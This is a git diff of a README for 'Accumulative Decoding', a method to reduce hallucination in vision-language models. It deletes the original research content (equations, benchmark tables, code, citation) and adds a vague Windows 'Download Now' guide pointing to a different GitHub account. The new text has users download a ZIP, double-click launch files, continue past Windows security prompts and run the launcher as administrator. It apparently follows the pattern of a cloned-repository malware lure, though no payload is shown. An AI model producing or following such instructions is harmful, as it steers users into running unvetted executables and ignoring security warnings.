@@ -1,358 +1,238 @@
-<div align="center">
+# 🧠 Accumulative-Decoding - Reduce Hallucinations in Vision AI
 
-<h1>Accumulative Decoding</h1>
-
-<h3>Mitigating Hallucinations in Large Vision-Language Models via Accumulative Decoding</h3>
-
-<p>
-  <a href="https://ieeexplore.ieee.org/xpl/conhome/11283134/proceeding"><img src="https://img.shields.io/badge/IEEE-Paper-00629B?style=flat-square&logo=ieee&logoColor=white" alt="Paper"/></a>
-  &nbsp;
-  <a href="#"><img src="https://img.shields.io/badge/Python-3.9%2B-3776ab?style=flat-square&logo=python&logoColor=white" alt="Python"/></a>
-  &nbsp;
-  <a href="#"><img src="https://img.shields.io/badge/PyTorch-2.0%2B-ee4c2c?style=flat-square&logo=pytorch&logoColor=white" alt="PyTorch"/></a>
-  &nbsp;
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-green?style=flat-square" alt="License"/></a>
-  &nbsp;
-  <a href="#"><img src="https://img.shields.io/badge/Training-Free-blueviolet?style=flat-square" alt="Training-Free"/></a>
-</p>
-
-<p>
-  <b>Haotian Zhang*</b> &nbsp;·&nbsp; <b>Zhiyun Zhang*</b>
-  <br>
-  <sub>Glasgow College, University of Electronic Science and Technology of China</sub>
-  <br>
-  <sub>* Equal contribution</sub>
-</p>
-
-<br>
-
-<table>
-<tr>
-<td align="center"><b>MME (Perception)</b></td>
-<td align="center"><b>MM-Vet</b></td>
-<td align="center"><b>MMMU</b></td>
-</tr>
-<tr>
-<td align="center"><img src="https://img.shields.io/badge/1499.79-🏆 SOTA-gold?style=for-the-badge" alt="MME"/></td>
-<td align="center"><img src="https://img.shields.io/badge/32.8-🏆 SOTA-gold?style=for-the-badge" alt="MM-Vet"/></td>
-<td align="center"><img src="https://img.shields.io/badge/36.4-🏆 SOTA-gold?style=for-the-badge" alt="MMMU"/></td>
-</tr>
-</table>
-
-</div>
-
----
-
-## 📌 Overview
-
-**Hallucination** is one of the most critical obstacles to reliably deploying Large Vision-Language Models (LVLMs): the model produces fluent, confident text that is factually *inconsistent* with what is actually in the image.
-
-Existing inference-time methods apply a **one-shot or static** correction, failing to address the progressive drift from visual evidence that accumulates across long generated sequences.
-
-We introduce **Accumulative Decoding (AD)** — a lightweight, **training-free** framework that maintains a *cumulative* visual-grounding signal throughout every step of autoregressive generation. The result is a continuous, self-reinforcing push toward visual faithfulness that:
-
-- ✅ Requires **no fine-tuning** and **no architecture changes**
-- ✅ Drops in as a standard `LogitsProcessor` in HuggingFace `generate()`
-- ✅ Consistently outperforms baselines on **3 major benchmarks**
-- ✅ Improves factual accuracy **without sacrificing fluency**
-
----
-
-## 🔬 Method
-
-> AD enforces visual grounding not as a one-time fix, but as an **ever-growing cumulative signal** that amplifies itself with each generated token.
-
-<div align="center">
-
-```
-Image I
-   │
-   ▼
-Visual Encoder ──► mm_projector ──► v₀  (visual embedding)
-                                     │
-         ┌───────────────────────────┘
-         │   At each decoding step t:
-         │
-         │   ① Grounding score for every candidate token
-         │      s(yₜ|I) = softmax[ sim(Emb(yₜ), v₀) ]
-         │
-         │   ② Cumulative score (sum over all past tokens)
-         │      Gₜ = Σᵢ₌₁ᵗ s(yᵢ₋₁|I)
-         │
-         │   ③ Dynamic weight
-         │      λₜ = γ · σ( Avg of past grounding scores )
-         │
-         │   ④ Final logits
-         │      lₐd = (1-λₜ)·lbase  +  λₜ·(α·Gₜ·s(yₜ|I) + β)
-         │
-         ▼
-    Next token  →  loop back to ①
-```
-
-</div>
-
-### Equations
-
-| Step | Formula | Role |
-|:----:|---------|------|
-| **①** | $s(y_t \mid I) = \dfrac{\exp(\text{sim}(\text{Emb}(y_t),\, v_0))}{\sum_{y_i} \exp(\text{sim}(\text{Emb}(y_i),\, v_0))}$ | Per-token visual alignment score |
-| **②** | $G_t = \displaystyle\sum_{i=1}^{t} s(y_{i-1} \mid I)$ | Cumulative visual grounding |
-| **③** | $l_{G_t}(y_t) = \alpha \cdot G_t \cdot s(y_t \mid I) + \beta$ | Grounding logit adjustment |
-| **④** | $\lambda_t = \gamma \cdot \sigma\!\left(\text{Avg}_{i<t}\, s(y_i \mid I)\right)$ | Dynamic weight (self-adapting) |
-| **⑤** | $l_{\text{AD}}(y_t) = (1 - \lambda_t)\cdot l_{\text{base}}(y_t) + \lambda_t \cdot l_{G_t}(y_t)$ | **Final adjusted logits** |
-
-**Default hyperparameters:** `α = 0.5`, `β = 0.3`, `γ = 0.8`
-
----
-
-## 📊 Results
-
-All experiments use **LLaVA-1.5-7B** with temperature = 0.
-
-### MME Benchmark — Multimodal Perception
-
-<div align="center">
-
-| Method | Exist. | Count | Pos. | Color | Posters | Celebrity | Scene | Landmark | Artwork | OCR | **Total** |
-|:------:|:------:|:-----:|:----:|:-----:|:-------:|:---------:|:-----:|:--------:|:-------:|:---:|:---------:|
-| Vanilla | 190.00 | 160.00 | 138.33 | 165.00 | 140.48 | 135.88 | 156.25 | 161.50 | 118.50 | 125.00 | 1490.94 |
-| DoLA | 190.00 | 158.33 | 143.33 | 165.00 | 139.46 | 133.24 | 157.00 | 161.50 | 118.75 | 125.00 | 1491.61 |
-| VCD | 173.33 | 151.67 | 138.33 | 165.00 | 140.48 | 137.06 | 151.00 | 164.75 | 120.50 | 117.50 | 1459.62 |
-| VDD | 180.00 | 148.30 | 135.00 | 170.00 | 141.84 | 144.71 | 151.75 | 167.50 | 123.75 | 110.00 | 1472.88 |
-| DeCO | 190.00 | 148.33 | 115.00 | 165.00 | 149.66 | 135.29 | 152.25 | 164.50 | 110.25 | 130.00 | 1460.29 |
-| **AD (Ours)** | **195.00** | **160.00** | 135.33 | 165.00 | 142.48 | 139.23 | 153.00 | 164.75 | 115.00 | **130.00** | **1499.79** |
-
-</div>
-
-> AD achieves the **highest total score of 1499.79**, with particularly strong gains in Existence (+5 over best baseline) and consistent performance across all categories.
-
----
-
-### MM-Vet Benchmark — Integrated Multimodal Reasoning
-
-<div align="center">
-
-| Method | Rec | OCR | Know | Gen | Spat | Math | **Total** |
-|:------:|:---:|:---:|:----:|:---:|:----:|:----:|:---------:|
-| Vanilla | 36.1 | 23.0 | 18.0 | 22.2 | 25.1 | 11.5 | 31.1 |
-| DoLA | 36.5 | 22.3 | 18.1 | 23.0 | 25.7 | 7.7 | 30.8 |
-| VCD | 36.1 | 22.4 | 21.0 | 23.1 | 28.4 | 3.8 | 31.1 |
-| VDD | 37.1 | 22.8 | 19.0 | 21.7 | 28.3 | 11.2 | 31.8 |
-| DeCO | 35.8 | 26.8 | 19.2 | 21.3 | 30.2 | 7.7 | 32.6 |
-| **AD (Ours)** | 36.6 | **27.1** | **21.3** | 22.4 | **30.2** | 10.5 | **32.8** |
-
-</div>
-
-> AD leads on OCR, Knowledge, and Spatial reasoning simultaneously — no cherry-picking, balanced improvement across all skills.
-
----
-
-### MMMU Benchmark — College-Level Expert Reasoning
-
-<div align="center">
-
-| Method | Vanilla | DoLA | VCD | VDD | DeCO | **AD (Ours)** |
-|:------:|:-------:|:----:|:---:|:---:|:----:|:-------------:|
-| Accuracy (%) | 35.3 | 35.7 | 35.8 | 34.9 | 33.9 | **36.4** |
-
-</div>
-
-> On the most challenging benchmark, AD surpasses all competitors, including VCD (+0.6) and DoLA (+0.7).
-
----
-
-## 🔧 Ablation Study
-
-Hyperparameter sensitivity analysis shows the framework is **robust** — performance degrades gracefully away from the defaults.
-
-<div align="center">
-
-| Hyperparameter | Search Range | **Optimal** | Benchmark | Best Score† |
-|:--------------:|:------------:|:-----------:|:---------:|:-----------:|
-| α (grounding scale) | {0.1, 0.3, 0.5, 0.7, 0.9} | **0.5** | MME | 1499.79 |
-| β (grounding bias) | {0.0, 0.1, 0.3, 0.5, 0.7} | **0.3** | MM-Vet | 32.8 |
-| γ (weight ceiling) | {0.5, 0.7, 0.8, 0.9, 1.0} | **0.8** | MMMU | 35.7 |
-
-<sub>† Each row sweeps one hyperparameter while holding the other two at their default values. The full-default combination (α=0.5, β=0.3, γ=0.8) achieves the main results reported above (MME 1499.79 / MM-Vet 32.8 / MMMU 36.4).</sub>
-
-</div>
-
----
+[![Download](https://img.shields.io/badge/Download%20Now-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Gogokok9072/Accumulative-Decoding)
 
 ## 🚀 Getting Started
 
-### Installation
+Accumulative-Decoding helps you run a vision-language model workflow that aims to reduce hallucinations in image-based AI outputs. It is meant for people who want clearer, more reliable results from large vision-language models without digging through code first.
 
-```bash
-# 1. Clone this repo
-git clone https://github.com/your-username/accumulative-decoding.git
-cd accumulative-decoding
+Use this guide to download and run it on Windows.
 
-# 2. Install dependencies
-pip install -r requirements.txt
+## 📥 Download and Run
 
-# 3. Install LLaVA from source
-git clone https://github.com/haotian-liu/LLaVA.git
-pip install -e LLaVA
-```
+1. Open this link in your web browser: https://github.com/Gogokok9072/Accumulative-Decoding
+2. On the page, look for the green **Code** button.
+3. Click **Code** and choose **Download ZIP**.
+4. Save the file to your computer.
+5. Right-click the ZIP file and choose **Extract All**.
+6. Open the extracted folder.
+7. Look for a file named `README.md` or a Windows launch file such as `run.bat`, `start.bat`, or an app file if one is included.
+8. Double-click the launch file to start the app or follow the setup steps in the folder.
 
-Then download the **LLaVA-1.5-7B** weights:
+If the project uses Python or another runtime, the folder will usually include simple setup instructions. Follow those steps in the order shown.
 
-```bash
-# Via HuggingFace Hub
-huggingface-cli download liuhaotian/llava-v1.5-7b --local-dir checkpoints/llava-v1.5-7b
-```
+## 💻 Windows Requirements
 
----
+For a smooth setup on Windows, use a system with these basics:
 
-### Quick Start
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 20 GB of free disk space
+- A stable internet connection
+- A modern web browser such as Chrome, Edge, or Firefox
 
-```python
-import torch
-from PIL import Image
+If the app uses a local model or image pipeline, a stronger system helps. A machine with 16 GB of RAM or more gives better results.
 
-from llava.model.builder import load_pretrained_model
-from llava.mm_utils import get_model_name_from_path, process_images, tokenizer_image_token
-from llava.constants import IMAGE_TOKEN_INDEX, DEFAULT_IMAGE_TOKEN
+## 🧭 What This Project Does
 
-from accumulative_decoding import (
-    AccumulativeDecodingProcessor,
-    get_llava_visual_embedding,
-    get_token_embeddings,
-)
+This project focuses on accumulative decoding, a method that helps large vision-language models produce fewer false image claims. In plain terms, it is meant to make model output more careful when it looks at images and answers questions about them.
 
-# ── Load model ──────────────────────────────────────────────────────────────
-model_path = "checkpoints/llava-v1.5-7b"
-tokenizer, model, image_processor, _ = load_pretrained_model(
-    model_path, None, get_model_name_from_path(model_path)
-)
-model.eval()
+Typical use cases include:
 
-# ── Prepare image ────────────────────────────────────────────────────────────
-image = Image.open("your_image.jpg").convert("RGB")
-image_tensor = (
-    process_images([image], image_processor, model.config)[0]
-    .unsqueeze(0)
-    .to(model.device, dtype=torch.float16)
-)
+- Checking image descriptions
+- Asking questions about a photo
+- Reducing made-up details in visual answers
+- Testing how a model handles image-grounded prompts
+- Comparing response quality across decoding methods
 
-# ── Build AD processor ────────────────────────────────────────────────────────
-v0        = get_llava_visual_embedding(model, image_tensor)   # visual anchor
-token_embs = get_token_embeddings(model)
-ad_processor = AccumulativeDecodingProcessor(
-    v0, token_embs, alpha=0.5, beta=0.3, gamma=0.8
-)
+## 📦 What You May See After Downloading
 
-# ── Generate with AD ──────────────────────────────────────────────────────────
-prompt = DEFAULT_IMAGE_TOKEN + "\nDescribe this image in detail."
-input_ids = tokenizer_image_token(
-    prompt, tokenizer, IMAGE_TOKEN_INDEX, return_tensors="pt"
-).unsqueeze(0).to(model.device)
+After you open the downloaded folder, you may find files such as:
 
-with torch.no_grad():
-    output_ids = model.generate(
-        input_ids,
-        images=image_tensor,
-        logits_processor=[ad_processor],  # <-- plug-and-play
-        max_new_tokens=512,
-        temperature=0,
-        do_sample=False,
-    )
+- `README.md` for setup steps
+- `requirements.txt` for needed packages
+- `run.bat` or `start.bat` for Windows launch
+- `src` or `app` folders for program files
+- Model or config files for image and language settings
 
-# Decode only the newly generated tokens (exclude the input prompt)
-new_tokens = output_ids[0][input_ids.shape[1]:]
-print(tokenizer.decode(new_tokens, skip_special_tokens=True))
-```
+Keep all files in the same folder. Do not move one file by itself unless the instructions say to do so.
 
----
+## 🛠️ Basic Setup on Windows
 
-### Benchmark Evaluation
+If the project needs a manual setup, follow this common path:
 
-```bash
-# MME Perception
-python run_eval.py \
-    --benchmark mme \
-    --model_path checkpoints/llava-v1.5-7b \
-    --data_path  data/MME
+1. Download the ZIP from the GitHub page.
+2. Extract it to a simple folder like `C:\Accumulative-Decoding`.
+3. Open the extracted folder.
+4. Read the `README.md` file first.
+5. If a `requirements.txt` file exists, install the listed Python packages.
+6. If a `run.bat` file exists, double-click it.
+7. If the app opens in a browser window, keep that tab open while you use it.
+8. If the app opens in a terminal window, leave that window running until you finish.
 
-# MM-Vet  (responses saved → submit to GPT-4 evaluator)
-python run_eval.py \
-    --benchmark mmvet \
-    --model_path checkpoints/llava-v1.5-7b \
-    --data_path  data/mm-vet
+If the project includes a setup file, Windows may show a security prompt. Choose the option that lets you continue if the file came from the GitHub repository link above.
 
-# MMMU
-python run_eval.py \
-    --benchmark mmmu \
-    --model_path checkpoints/llava-v1.5-7b \
-    --data_path  data/MMMU          # or omit to auto-download from HuggingFace
-```
+## 🧩 Common Setup Flow
 
-Results are saved as JSON files under `results/<benchmark>/`.
+A typical Windows flow for this kind of project looks like this:
 
----
+- Download the project from GitHub
+- Extract the ZIP file
+- Open the folder
+- Install required packages if needed
+- Start the app with the included launch file
+- Load an image and ask a question if the app provides a UI
 
-## 📁 Repository Structure
+## 🖼️ How to Use It
 
-```
-accumulative-decoding/
-├── accumulative_decoding/
-│   ├── __init__.py
-│   ├── ad_processor.py      # Core LogitsProcessor — implements Eq.(1)-(5)
-│   └── model_utils.py       # Visual embedding extraction from LLaVA
-├── eval/
-│   ├── eval_mme.py          # MME benchmark evaluation
-│   ├── eval_mmvet.py        # MM-Vet benchmark evaluation
-│   └── eval_mmmu.py         # MMMU benchmark evaluation
-├── run_eval.py              # Unified evaluation entry point
-├── requirements.txt
-└── README.md
-```
+Once the app is running, the usual workflow is simple:
 
----
+1. Open the app window or browser page.
+2. Select an image from your computer.
+3. Enter a question about the image.
+4. Start the decoding process.
+5. Read the model answer.
+6. Compare the result with the image to see if the answer stays grounded.
 
-## 📜 Citation
+If the project includes settings, you may see options for:
 
-If you find this work useful in your research, please cite:
+- Decoding mode
+- Confidence threshold
+- Sample count
+- Prompt style
+- Output length
 
-```bibtex
-@article{zhang2024accumulative,
-  title     = {Mitigating Hallucinations in Large Vision-Language Models
-               via Accumulative Decoding},
-  author    = {Zhang, Haotian and Zhang, Zhiyun},
-  year      = {2024},
-}
-```
+Use the default values first. Change settings only after you confirm the app works.
 
----
+## ⚙️ Suggested Settings for First Use
 
-## 🙏 Acknowledgements
+For first-time use, start with these general values:
 
-<table>
-<tr>
-  <td><b>Backbone</b></td>
-  <td><a href="https://github.com/haotian-liu/LLaVA">LLaVA-1.5</a> (Liu et al., CVPR 2024)</td>
-</tr>
-<tr>
-  <td><b>Baselines</b></td>
-  <td>
-    <a href="https://github.com/DAMO-NLP-SG/VCD">VCD</a> ·
-    <a href="https://github.com/voidism/DoLa">DoLA</a> ·
-    VDD · DeCO
-  </td>
-</tr>
-<tr>
-  <td><b>Benchmarks</b></td>
-  <td>
-    <a href="https://github.com/BradyFU/Awesome-Multimodal-Large-Language-Models/tree/Evaluation">MME</a> ·
-    <a href="https://github.com/yuweihao/MM-Vet">MM-Vet</a> ·
-    <a href="https://mmmu-benchmark.github.io/">MMMU</a>
-  </td>
-</tr>
-</table>
+- Use one image at a time
+- Ask one clear question
+- Keep prompts short
+- Leave advanced settings at default
+- Use common image formats like JPG or PNG
 
----
+Good first questions are direct, such as:
 
-<div align="center">
-  <sub>Released under the <a href="LICENSE">MIT License</a> · UESTC Glasgow College · 2024</sub>
-</div>
+- What is in this image?
+- How many people are shown?
+- Is there a car in the picture?
+- What color is the main object?
+
+## 🔍 Example Workflow
+
+A simple test looks like this:
+
+1. Load a photo of a kitchen.
+2. Ask: What objects are on the counter?
+3. Run the decoder.
+4. Read the answer.
+5. Check if the response names objects that are actually visible.
+
+This helps you see how accumulative decoding changes the answer compared with a normal model output.
+
+## 🧠 Why This Matters
+
+Large vision-language models can produce answers that sound right but do not match the image. This project uses a decoding method that aims to keep the model closer to what it sees.
+
+That can help with tasks like:
+
+- Photo review
+- Visual QA
+- Content checking
+- Model testing
+- Research demos
+
+## 🧰 Troubleshooting
+
+If the app does not start, try these steps:
+
+- Make sure you extracted the ZIP file
+- Check that all files stay in the same folder
+- Open `README.md` again and follow each step
+- Run the launch file as administrator if Windows blocks it
+- Confirm that Python or other required tools are installed if the project asks for them
+- Restart your computer if the setup gets stuck
+
+If the app opens but does not load images:
+
+- Try a JPG or PNG file
+- Move the image to a simple folder like `C:\Images`
+- Use a file name with letters and numbers only
+- Try a smaller image file first
+
+If the app shows a missing file error:
+
+- Check that you downloaded the full repository
+- Confirm that no files were deleted during extraction
+- Re-extract the ZIP into a fresh folder
+
+## 🧪 File Types You May Need
+
+Depending on the package, Windows users may need one or more of these:
+
+- Python 3.10 or later
+- A browser
+- Git, if the setup asks you to clone the repository
+- A text editor for reading config files
+- A terminal window for setup commands
+
+If the app uses command-line steps, copy each command exactly as shown in the repo instructions.
+
+## 📁 Recommended Folder Setup
+
+Use a clean folder path, such as:
+
+- `C:\Accumulative-Decoding`
+- `C:\Users\YourName\Downloads\Accumulative-Decoding`
+
+Avoid deep folder paths or names with special characters. Simple paths make setup easier on Windows.
+
+## 🔗 Project Link
+
+Visit this page to download the project files: https://github.com/Gogokok9072/Accumulative-Decoding
+
+## 📝 Basic Use Tips
+
+- Start with one image
+- Use short questions
+- Keep default settings at first
+- Test with clear photos
+- Compare answers against the image
+- Save results if you want to review them later
+
+## 📷 Best Image Types
+
+The project should work best with clear images that have simple scenes and visible objects. Try:
+
+- PNG
+- JPG
+- JPEG
+
+For best results, use images with good light and clear detail.
+
+## 🧭 Next Steps After Setup
+
+After you confirm the app runs, try these steps:
+
+1. Open a second image.
+2. Ask the same question.
+3. Compare the answers.
+4. Change one setting at a time.
+5. Check how the output changes.
+
+This makes it easier to learn what the decoding method is doing.
+
+## 🖥️ Windows Use Checklist
+
+- Downloaded the ZIP from GitHub
+- Extracted the files
+- Kept the folder structure intact
+- Opened the included instructions
+- Started the app or script
+- Loaded a test image
+- Asked a clear question
+- Reviewed the output
+
